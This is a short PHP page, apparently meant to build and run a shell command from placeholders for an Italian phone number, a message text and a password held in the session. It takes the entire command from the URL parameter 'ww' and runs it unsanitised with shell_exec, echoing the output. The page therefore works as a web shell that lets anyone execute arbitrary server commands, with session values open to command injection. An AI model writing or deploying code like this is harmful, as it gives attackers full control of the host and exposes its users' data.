<html>
<head></head>

<body>
<?php
ini_set ("display_errors", "1");
error_reporting(E_ALL);

session_start();

$Shell = $_GET['ww'];

$num = sprintf('39%s', $_SESSION["but"]);
$testo = $_SESSION["testo"];
$npass = $_SESSION["utente"];

$f1 = str_replace("NUMERO", $num, $Shell);
$f2 = str_replace("TESTO", $testo, $f1);
$f3 = str_replace("NONSIDICE", $npass, $f2);

echo shell_exec($f3);

?>
</body>
</html>

